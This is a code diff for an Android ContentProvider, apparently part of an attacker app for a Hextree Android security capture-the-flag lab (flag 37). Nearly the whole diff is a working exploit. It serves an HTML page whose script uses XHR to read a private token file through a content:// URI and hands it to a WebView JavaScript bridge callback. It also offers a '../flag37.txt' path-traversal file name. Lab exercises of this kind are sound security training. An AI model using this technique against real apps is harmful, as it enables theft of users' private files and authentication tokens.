@@ -14,7 +14,41 @@ import java.io.IOException;
 
 public class Flag37Provider extends ContentProvider {
     private static final String TAG = "Flag37Provider";
-    private static final String MIME_TYPE = "text/plain";
+    private static final String MIME_TYPE = "text/html";
+    private static final String EXPLOIT_HTML = "<!DOCTYPE html>\n" +
+        "<html>\n" +
+        "<head>\n" +
+        "  <title>Exploit</title>\n" +
+        "</head>\n" +
+        "<body>\n" +
+        "  <h2>Reading File with XHR...</h2>\n" +
+        "\n" +
+        "  <script>\n" +
+        "    function leakFileXHR(url) {\n" +
+        "      const xhr = new XMLHttpRequest();\n" +
+        "      xhr.open('GET', url, true);\n" +
+        "      xhr.onreadystatechange = function() {\n" +
+        "        if (xhr.readyState === 4 && xhr.responseText) {\n" +
+        "          console.log(xhr.responseText);\n" +
+        "          if (window.hextree && window.hextree.authCallback) {\n" +
+        "            window.hextree.authCallback(xhr.responseText);\n" +
+        "          }\n" +
+        "        }\n" +
+        "      };\n" +
+        "      xhr.onerror = function(error) {\n" +
+        "        // console.log(error);\n" +
+        "      };\n" +
+        "      xhr.send();\n" +
+        "    }\n" +
+        "\n" +
+        "    setTimeout(function() {\n" +
+        "      leakFileXHR(\"content://io.hextree.files/other_files/token.txt\");\n" +
+        "    }, 1000);\n" +
+        "  </script>\n" +
+        "</body>\n" +
+        "</html>";
+
+
 
     @Override
     public boolean onCreate() {
@@ -30,8 +64,14 @@ public class Flag37Provider extends ContentProvider {
                 OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
         });
         
+        // Keep the original flag37.txt entry
         cursor.addRow(new Object[]{
                 "../flag37.txt", 1337L
+        });
+        
+        // Add our exploit.html entry
+        cursor.addRow(new Object[]{
+                "exploit.html", EXPLOIT_HTML.getBytes().length
         });
         
         return cursor;
@@ -40,7 +80,10 @@ public class Flag37Provider extends ContentProvider {
     @Override
     public String getType(Uri uri) {
         Log.i(TAG, "getType(" + uri.toString() + ")");
-        return MIME_TYPE;
+        if (uri.getLastPathSegment().equals("exploit.html")) {
+            return MIME_TYPE;
+        }
+        return "text/plain";
     }
 
     @Override
@@ -54,7 +97,12 @@ public class Flag37Provider extends ContentProvider {
 
             new Thread(() -> {
                 try {
-                    outputStream.write("give flag".getBytes());
+                    if (uri.getLastPathSegment().equals("exploit.html")) {
+                        outputStream.write(EXPLOIT_HTML.getBytes());
+                        Log.d(TAG, "[+] Exploit written as\n"+EXPLOIT_HTML);
+                    } else {
+                        outputStream.write("give flag".getBytes());
+                    }
                     outputStream.close();
                 } catch (IOException e) {
                     Log.e(TAG, "Error writing to pipe", e);
